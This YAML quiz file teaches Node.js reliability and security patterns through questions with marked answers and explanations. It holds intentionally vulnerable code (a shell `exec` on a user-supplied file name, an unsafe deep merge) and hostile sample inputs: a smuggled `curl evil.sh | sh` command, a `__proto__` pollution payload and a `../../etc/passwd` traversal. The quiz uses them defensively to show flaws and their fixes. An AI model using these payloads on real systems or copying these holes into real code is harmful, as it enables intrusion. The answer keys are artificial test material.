version: 1
title: "Architect Roadmap 23: Reliability and security in Node.js"
description: Graceful shutdown and health checks, timeouts, retries with backoff and jitter, circuit breakers, bulkheads, load shedding and rate limiting, plus threat-model reasoning on injection, prototype pollution, SSRF, secrets, least privilege and npm supply-chain risk.
language: en
tags: [architect-roadmap, nodejs, reliability, security, resilience]
run:
  questionsPerRun: 10
  maxErrors: 3
  timePerQuestionSec: 60
questions:
  - type: single
    prompt: "A Node.js HTTP service is told to stop during a rolling deploy. Which shutdown sequence loses the fewest requests?"
    explanation: "A graceful shutdown first stops taking new work (failing readiness so the load balancer stops routing, and closing the listener), then lets in-flight requests finish, then closes shared resources such as DB pools and broker connections, and only then exits, with a hard deadline as a backstop. Exiting at once drops in-flight work, and closing the DB first makes the active requests fail."
    theoryUrl: https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/#pod-termination
    options:
      - {
          text: "Close the DB pool, then stop the server, then let the in-flight requests finish",
          correct: false,
        }
      - {
          text: "Exit at once, because the load balancer will transparently retry every request that was lost",
          correct: false,
        }
      - {
          text: "Stop taking new work, drain in-flight requests, close the DB and brokers, then exit",
          correct: true,
        }
      - {
          text: "Ignore the signal and wait for the orchestrator to force-kill the process when it is ready",
          correct: false,
        }
  - type: single
    prompt: "A service exposes a liveness probe and a readiness probe. Its database becomes unreachable for a few minutes. How should the probes behave?"
    explanation: "Readiness answers 'should I get traffic right now?', so it can fail while the dependency is down and the instance stops receiving requests it cannot serve. Liveness answers 'is this process stuck beyond repair?'; failing it because of the database makes the orchestrator restart every instance at once, which does not fix the database and adds a restart storm on top of the outage."
    theoryUrl: https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/
    options:
      - {
          text: "Both should fail, so that the orchestrator restarts the pods until the database is back",
          correct: false,
        }
      - {
          text: "Readiness may fail to take traffic away; liveness should stay healthy",
          correct: true,
        }
      - {
          text: "Liveness should fail and readiness should stay healthy, so traffic keeps flowing",
          correct: false,
        }
      - {
          text: "Neither should change, since probes must never depend on anything outside the process",
          correct: false,
        }
  - type: single
    prompt: "A Node.js service calls a partner API with no timeout. One afternoon the partner starts accepting connections but answering very slowly. Why does this take your whole service down, not just the feature using the partner?"
    explanation: "Without a timeout each request waits indefinitely, holding sockets, memory and pending promises. As traffic keeps arriving, these pile up until the process runs out of sockets or memory and everything slows or crashes, which is a cascading failure. A timeout (for example `AbortSignal.timeout()` on `fetch`) bounds how long each call can hold resources. The event loop itself is not blocked by a pending network call."
    theoryUrl: https://aws.amazon.com/builders-library/timeouts-retries-and-backoff-with-jitter/
    options:
      - {
          text: "Waiting requests pile up and exhaust sockets and memory shared by every endpoint",
          correct: true,
        }
      - {
          text: "A pending HTTP call blocks the event loop until the response arrives",
          correct: false,
        }
      - {
          text: "Node retries every slow call forever by default, which multiplies the load on the process",
          correct: false,
        }
      - {
          text: "The partner's slowness is copied into your CPU usage, which is shared across all routes",
          correct: false,
        }
  - type: single
    prompt: "The mobile client gives up on a request after 2 seconds. Your API, to serve it, calls an inventory service with a 10-second timeout. What is wrong with this setup?"
    explanation: "Once the client has given up, any work the API keeps doing for that request is wasted, and under a slow inventory service those waits hold resources for up to 10 seconds per request. Timeouts should shrink as you go down the call chain, ideally by propagating a deadline so each hop knows how much time is left. A longer downstream timeout does not make the client wait longer."
    theoryUrl: https://sre.google/sre-book/addressing-cascading-failures/
    options:
      - {
          text: "Nothing: a longer downstream timeout gives the inventory service more chances to succeed",
          correct: false,
        }
      - {
          text: "The client will wait the full 10 seconds, because the server's timeout overrides the client's",
          correct: false,
        }
      - {
          text: "The API keeps working and holding resources long after the client gave up; pass down a deadline",
          correct: true,
        }
      - {
          text: "Timeouts must be identical at every hop, so the inventory call should also be exactly 2 seconds",
          correct: false,
        }
  - type: multi
    prompt: "A service calls other HTTP services. Which failures are generally reasonable to retry automatically, with backoff? Select all that apply."
    explanation: "Retries help with transient failures: a 503 or 429 from an overloaded peer, a connection reset, or a timeout on an idempotent read. A 400 or 422 means the request itself is invalid and will fail the same way every time, and a 401 needs new credentials, not another attempt. Even transient errors should only be retried when the operation is idempotent or protected by an idempotency key."
    theoryUrl: https://learn.microsoft.com/en-us/azure/architecture/patterns/retry
    options:
      - { text: "A 503 Service Unavailable from an overloaded downstream", correct: true }
      - { text: "A connection reset while sending a GET request", correct: true }
      - { text: "A timeout on an idempotent read", correct: true }
      - { text: "A 400 Bad Request caused by a missing field in the body", correct: false }
      - { text: "A 401 Unauthorized because the API token has been revoked", correct: false }
  - type: single
    prompt: "A thousand clients lose their connection to a service at the same moment and all retry with plain exponential backoff (1 s, 2 s, 4 s...). Why is adding random jitter to the delay recommended?"
    explanation: "With identical backoff schedules, all clients retry at the same instants, so the recovering service receives synchronised waves of traffic that can knock it over again. Jitter spreads the retries over time and smooths the load. It does not make individual retries faster or more likely to succeed on their own, and it is not about security."
    theoryUrl: https://aws.amazon.com/builders-library/timeouts-retries-and-backoff-with-jitter/
    options:
      - {
          text: "It shortens the average delay between attempts, so each individual client recovers sooner after the outage",
          correct: false,
        }
      - {
          text: "It spreads the retries out so they do not hit the recovering service in synchronised waves",
          correct: true,
        }
      - {
          text: "It hides the retry timing from attackers, who could otherwise predict the schedule",
          correct: false,
        }
      - {
          text: "It lets the server tell retries apart from first attempts, so it can serve them first",
          correct: false,
        }
  - type: single
    prompt: "A request passes through three services, A → B → C → database. Each layer makes up to 3 attempts when the layer below fails. The database becomes slow and every call times out. What happens, and what is the usual remedy?"
    explanation: "Retries multiply: 3 attempts at A, each making 3 at B, each making 3 at C, means up to 27 database calls per user request, exactly when the database is struggling. The usual remedy is to retry at a single layer (often the one closest to the failure or the edge), and to cap retries with a retry budget or a circuit breaker. Adding more attempts or removing timeouts makes the overload worse."
    theoryUrl: https://sre.google/sre-book/addressing-cascading-failures/
    options:
      - {
          text: "Up to 27 database calls per request; retry at one layer only and cap retries with a budget",
          correct: true,
        }
      - {
          text: "Up to 9 database calls per request; that load is harmless, so leave the setup as it is",
          correct: false,
        }
      - {
          text: "Exactly 3 database calls, because the layers coordinate and share one retry counter",
          correct: false,
        }
      - {
          text: "Retries never reach the database, since a timeout cancels the whole chain at once",
          correct: false,
        }
  - type: single
    prompt: "What problem does a circuit breaker around calls to a failing dependency solve?"
    explanation: "After repeated failures the breaker opens and calls fail immediately for a while, instead of each one waiting for a timeout. That protects your own resources and gives the dependency room to recover; after a cool-down it lets a few trial calls through (half-open) and closes again if they succeed. It does not retry for you, and it does not fix the dependency."
    theoryUrl: https://martinfowler.com/bliki/CircuitBreaker.html
    options:
      - {
          text: "It retries each failed call until the dependency answers, so callers never see an error",
          correct: false,
        }
      - {
          text: "It fails fast while the dependency is down, then probes to see whether it has recovered",
          correct: true,
        }
      - {
          text: "It encrypts the connection so that a failing dependency cannot leak data to callers",
          correct: false,
        }
      - {
          text: "It load-balances calls across replicas of the dependency based on their latency",
          correct: false,
        }
  - type: single
    prompt: "A product page calls a recommendations service through a circuit breaker. The breaker is open. What should the page do?"
    explanation: "An open breaker is a signal to degrade gracefully: serve the page without that section, or with a cached or default list such as bestsellers. Retrying through an open breaker defeats its purpose, and failing the whole page turns a non-critical outage into a critical one. Whether a fallback is acceptable is a product decision, but for an optional widget it almost always is."
    theoryUrl: https://learn.microsoft.com/en-us/azure/architecture/patterns/circuit-breaker
    options:
      - {
          text: "Return a 500 for the whole page, so the user knows to come back later",
          correct: false,
        }
      - {
          text: "Retry the recommendations call in a tight loop until the breaker closes again, then render the full page",
          correct: false,
        }
      - {
          text: "Render the page with a fallback, such as cached bestsellers or no recommendations",
          correct: true,
        }
      - {
          text: "Bypass the breaker and call the service directly, since the page needs the data",
          correct: false,
        }
  - type: single
    prompt: "A Node.js service uses one shared HTTP agent and one DB pool for everything. A slow reporting endpoint, hit by a batch job, takes all the connections, and checkout requests start timing out. Which pattern addresses this?"
    explanation: "A bulkhead isolates resources per workload or dependency (separate pools, concurrency limits or even separate instances), so one slow consumer can only exhaust its own share and checkout keeps working. A bigger shared pool only delays the problem, and retries add load to the saturated resource."
    theoryUrl: https://learn.microsoft.com/en-us/azure/architecture/patterns/bulkhead
    options:
      - {
          text: "Retries with exponential backoff on the checkout requests that time out",
          correct: false,
        }
      - {
          text: "Bulkheads: separate pools or concurrency limits for reporting and for checkout",
          correct: true,
        }
      - {
          text: "A larger shared pool, so reporting and checkout have more connections between them",
          correct: false,
        }
      - {
          text: "Caching every checkout response, so checkout no longer needs the database at all",
          correct: false,
        }
  - type: boolean
    prompt: "If a `POST /transfers` call to a payment provider times out, it is safe to simply send the same request again, because a timeout means the provider did not process it."
    explanation: "False. A timeout only means you did not get an answer in time; the provider may have processed the transfer and the response was lost or slow. Retrying a non-idempotent operation can execute it twice. Retry only when the operation is idempotent, or when the API supports an idempotency key that makes the retry return the original result."
    theoryUrl: https://aws.amazon.com/builders-library/making-retries-safe-with-idempotent-APIs/
    answer: false
  - type: single
    prompt: "Traffic suddenly doubles beyond what a service can handle. It queues every request in memory and processes them in order. Latency climbs to minutes and the process eventually crashes. What is the better behaviour under overload?"
    explanation: "An unbounded queue turns overload into huge latency for everyone and then a crash, and most queued requests are useless by the time they run because clients have given up. Shedding load early (bounded queues, rejecting with 503 or 429 when full, prioritising important traffic) keeps the accepted requests fast and the process alive. Clients can then back off and retry."
    theoryUrl: https://sre.google/sre-book/handling-overload/
    options:
      - {
          text: "Keep queuing, but give the queue more memory so it does not crash",
          correct: false,
        }
      - {
          text: "Process the newest requests first, while still accepting every request in the queue",
          correct: false,
        }
      - { text: "Bound the queue and reject excess requests early with 503 or 429", correct: true }
      - {
          text: "Drop the timeouts on downstream calls, so the queued work finishes faster",
          correct: false,
        }
  - type: single
    prompt: "A login endpoint is hit by a credential-stuffing attack: millions of username/password pairs from leaked lists, spread over thousands of IP addresses. Which rate-limiting design helps most?"
    explanation: "Spreading across thousands of IPs defeats a per-IP limit on its own, and a per-account limit alone lets an attacker try one password against many accounts. Combining limits on several keys (per account, per IP, and global failure rates), with escalation such as CAPTCHA or MFA on suspicious patterns, raises the attacker's cost. A limit on the whole service would lock out legitimate users too."
    theoryUrl: https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html
    options:
      - {
          text: "Limit only per IP address, since each attacker machine has a single address",
          correct: false,
        }
      - {
          text: "Combine limits per account, per IP and on overall failures, with step-up checks",
          correct: true,
        }
      - {
          text: "Limit the whole login endpoint to a fixed number of requests per second for everyone",
          correct: false,
        }
      - {
          text: "Return a generic error message, which on its own is enough to stop credential stuffing",
          correct: false,
        }
  - type: single
    prompt: "An unexpected exception escapes a handler and reaches `process.on('uncaughtException')`. What should the handler do?"
    explanation: "After an uncaught exception the process may be in an inconsistent state (half-updated objects, leaked resources, locks held), so the safe course is to log it, attempt a short best-effort cleanup, exit with a non-zero code and let the supervisor or orchestrator start a fresh process. Swallowing the error and carrying on risks serving wrong results or leaking resources for days."
    theoryUrl: https://nodejs.org/api/process.html#warning-using-uncaughtexception-correctly
    options:
      - {
          text: "Log it and keep serving, since one failed request should not affect the others",
          correct: false,
        }
      - {
          text: "Log it, clean up briefly, exit non-zero and let the supervisor restart the process",
          correct: true,
        }
      - {
          text: "Restart only the failing route by reloading its module with `require`",
          correct: false,
        }
      - {
          text: "Retry the handler that threw, until it succeeds or the client disconnects",
          correct: false,
        }
  - type: single
    prompt: "This helper deep-merges a user's JSON settings into their stored settings. A security review flags it. What is the risk, and what is a good fix?"
    code: |
      function merge(target, source) {
        for (const key of Object.keys(source)) {
          if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {}
            merge(target[key], source[key])
          } else {
            target[key] = source[key]
          }
        }
        return target
      }

      merge(user.settings, JSON.parse(req.body))
    codeLanguage: javascript
    explanation: 'A body like `{"__proto__": {"isAdmin": true}}` makes the merge walk into `Object.prototype` and add `isAdmin` to every object in the process, which can bypass checks such as `if (user.isAdmin)`. This is prototype pollution. Validate the input against a schema with an allowlist of keys, skip keys like `__proto__`, `constructor` and `prototype`, or use `Map`/`Object.create(null)` for dictionaries. HTTPS and size limits do not address it.'
    theoryUrl: https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html
    options:
      - {
          text: "Deep recursion can overflow the stack; rewrite the merge iteratively",
          correct: false,
        }
      - {
          text: "Keys like `__proto__` can pollute `Object.prototype`; validate keys against an allowlist",
          correct: true,
        }
      - {
          text: "`JSON.parse` executes code in the body; replace it with `eval` and a sandbox",
          correct: false,
        }
      - {
          text: "The body travels in clear text; serve the endpoint only over HTTPS and the risk goes away",
          correct: false,
        }
  - type: single
    prompt: "An endpoint makes a thumbnail by running an image tool on a file name taken from the request. How should it be fixed?"
    code: |
      const { exec } = require('node:child_process')

      app.post('/thumb', (req, res) => {
        exec(`convert uploads/${req.body.file} -resize 200 out.png`, (err) => {
          res.status(err ? 500 : 200).end()
        })
      })
    codeLanguage: javascript
    explanation: "`exec` runs the string through a shell, so a file name like `x.png; curl evil.sh | sh` runs arbitrary commands. Passing arguments as an array to `execFile` or `spawn` without a shell keeps them as data, and the file name should still be validated (for example against an id the server generated) to prevent path tricks. Escaping a few characters by hand is fragile, and authentication only limits who can attack."
    theoryUrl: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
    options:
      - {
          text: "Strip semicolons from the file name before building the command string",
          correct: false,
        }
      - {
          text: "Pass the arguments as an array to `execFile` with no shell, and validate the name",
          correct: true,
        }
      - {
          text: "Require users to be logged in, since only anonymous users try command injection",
          correct: false,
        }
      - {
          text: "Wrap the call in `try/catch`, so that malicious commands throw instead of running",
          correct: false,
        }
  - type: multi
    prompt: "A feature lets customers register a webhook URL that your Node.js service will POST events to. Which measures reduce the SSRF risk? Select all that apply."
    explanation: "A webhook sender makes requests to attacker-chosen URLs from inside your network, so it must not be able to reach internal addresses. Resolving the host and rejecting private, loopback and link-local ranges (checking the address actually connected to, not just the name), sending through an egress proxy or an isolated network segment, and not following redirects blindly all help. Validating that the URL starts with `https://` or hiding the response from the customer does not stop the request reaching internal targets."
    theoryUrl: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
    options:
      - {
          text: "Reject destinations that resolve to private, loopback or link-local addresses",
          correct: true,
        }
      - {
          text: "Send webhooks from an isolated network or through an egress proxy with an allowlist policy",
          correct: true,
        }
      - {
          text: "Do not follow redirects automatically, or re-check every redirect target",
          correct: true,
        }
      - { text: "Accept any URL as long as it starts with `https://`", correct: false }
  - type: single
    prompt: "A developer committed a production API key to the Git repository and removed it in the next commit an hour later. What should happen now?"
    explanation: "The key is still in the history and may already have been cloned, scanned by bots or copied into forks and CI logs. The only reliable fix is to revoke and rotate the key, then check its usage logs; rewriting history is optional clean-up, not a fix. Making the repository private later does not undo past exposure."
    theoryUrl: https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
    options:
      - { text: "Nothing, since the key was removed in the following commit", correct: false }
      - {
          text: "Rewrite the Git history to remove it, which makes the key safe to keep using",
          correct: false,
        }
      - { text: "Revoke and rotate the key, then review its usage logs for abuse", correct: true }
      - {
          text: "Make the repository private, which retroactively hides the leaked key",
          correct: false,
        }
  - type: multi
    prompt: "Which practices are sound for handling secrets (DB passwords, API keys) in a Node.js service? Select all that apply."
    explanation: "Secrets belong outside the code: injected at runtime from a secret manager or the platform, scoped per environment, and rotated. Logging the whole config at startup, or including it in error reports, is a common way to leak them. A `.env` file is fine for local development but committing it, or baking secrets into a Docker image, puts them wherever the repo or image goes."
    theoryUrl: https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
    options:
      - {
          text: "Load secrets at runtime from a secret manager or the deployment platform",
          correct: true,
        }
      - {
          text: "Use different secrets per environment, and rotate them on a schedule and after any leak",
          correct: true,
        }
      - {
          text: "Redact secrets from logs and error reports, including config dumps at startup",
          correct: true,
        }
      - {
          text: "Commit the `.env` file so every developer and CI job has the same secrets",
          correct: false,
        }
      - {
          text: "Bake the secrets into the Docker image so the container needs no configuration",
          correct: false,
        }
  - type: single
    prompt: "Why should a Node.js project commit its lockfile and install with `npm ci` in CI and production builds?"
    explanation: "The lockfile pins the exact version (and integrity hash) of every direct and transitive dependency, and `npm ci` installs exactly that and fails if `package.json` and the lockfile disagree. Builds are reproducible, and a newly published, possibly compromised version of a transitive package cannot slip in silently. It does not scan for vulnerabilities by itself, and it does not make installs slower in any meaningful way."
    theoryUrl: https://docs.npmjs.com/cli/v11/commands/npm-ci
    options:
      - {
          text: "So that npm automatically scans every package for malware during the install",
          correct: false,
        }
      - {
          text: "So builds install exactly the reviewed dependency tree, not whatever was just published",
          correct: true,
        }
      - {
          text: "So that every transitive dependency is automatically upgraded to its newest patch version on each build",
          correct: false,
        }
      - {
          text: "So the `node_modules` folder can be committed to Git instead of being installed",
          correct: false,
        }
  - type: multi
    prompt: "A popular transitive dependency publishes a new version whose install script steals environment variables from CI machines. Which measures would have limited the damage? Select all that apply."
    explanation: "Pinned installs from a lockfile keep the new version out until someone updates deliberately, and short-lived, narrowly scoped CI credentials limit what a stolen token can do. Disabling install scripts where they are not needed removes the most common execution point. Running `npm audit` only reports known advisories, so it would not catch a freshly published malicious version, and a larger number of dependencies increases the attack surface."
    theoryUrl: https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
    options:
      - {
          text: "Installing from a committed lockfile instead of floating version ranges",
          correct: true,
        }
      - {
          text: "Giving CI jobs short-lived credentials with only the permissions they need",
          correct: true,
        }
      - {
          text: "Disabling package install scripts where the build does not need them",
          correct: true,
        }
      - {
          text: "Running `npm audit` before each install, which flags new malicious versions at once",
          correct: false,
        }
  - type: single
    prompt: "An attacker achieves code execution in a Node.js API through a vulnerable dependency. The process runs as root in its container and connects to Postgres as the database superuser. What principle was missing, and why does it matter here?"
    explanation: "Least privilege limits what an attacker can do after a compromise. Running as root makes container escape and host tampering easier, and a superuser DB role lets them read every table, drop data or run server-side commands. A non-root user and a DB role limited to the tables and operations the service needs would have contained the breach. Encryption at rest and more replicas do not change what the compromised process is allowed to do."
    theoryUrl: https://nodejs.org/en/learn/getting-started/security-best-practices
    options:
      - {
          text: "Encryption at rest; it would have kept the attacker from reading any table",
          correct: false,
        }
      - {
          text: "Least privilege; it limits what a compromised process can reach and change",
          correct: true,
        }
      - {
          text: "High availability; more replicas would have diluted the attacker's access",
          correct: false,
        }
      - {
          text: "Defence by obscurity; a non-standard port would have hidden the database",
          correct: false,
        }
  - type: single
    prompt: "A JSON API accepts request bodies of any size. An attacker sends a few hundred 500 MB bodies. What is the main risk, and the main defence?"
    explanation: "Buffering and parsing huge bodies exhausts memory and, since JSON parsing is synchronous, blocks the event loop, so a handful of requests can deny service to everyone. Enforce a small body size limit at the edge and in the body parser, plus timeouts on slow uploads. Authentication helps only for authenticated routes, and compression makes the payload smaller on the wire but not in memory."
    theoryUrl: https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html
    options:
      - {
          text: "Memory exhaustion and a blocked loop; enforce a body size limit and upload timeouts",
          correct: true,
        }
      - {
          text: "Disk exhaustion from request logs; rotate and compress the log files more often while the attack lasts",
          correct: false,
        }
      - {
          text: "Data leakage; encrypt the bodies so that large payloads cannot be read",
          correct: false,
        }
      - {
          text: "None: Node streams every request body, so its size never affects memory",
          correct: false,
        }
  - type: single
    prompt: "A download endpoint serves `path.join('/srv/files', req.query.name)`. A tester requests `name=../../etc/passwd` and receives the file. Which fix reasons correctly about the threat?"
    explanation: "Joining user input to a base path lets `..` segments walk outside it. Resolve the final path and check that it is still inside the base directory, or better, map an opaque id to a server-side path so users never supply paths. Blocklisting the literal string `../` is easily bypassed with encodings or absolute paths, and checking the file extension does not stop traversal."
    theoryUrl: https://owasp.org/www-community/attacks/Path_Traversal
    options:
      - {
          text: "Remove every literal `../` sequence from the name before joining it to the base directory",
          correct: false,
        }
      - {
          text: "Resolve the path and verify it stays inside the base, or map ids to files",
          correct: true,
        }
      - {
          text: "Allow only names ending in `.pdf`, since system files have no extension",
          correct: false,
        }
      - {
          text: "Run the request through `encodeURIComponent` before calling `path.join`",
          correct: false,
        }
  - type: boolean
    prompt: "Prototype pollution matters much more on a Node.js server than in a single user's browser tab, because one server process handles the requests of many users."
    explanation: "True. A polluted `Object.prototype` lives for the whole process, so one attacker's request changes the behaviour of every later request from every user (for example an injected `isAdmin` default) until the process restarts. In a browser the damage is usually confined to that user's own page."
    theoryUrl: https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html
    answer: true
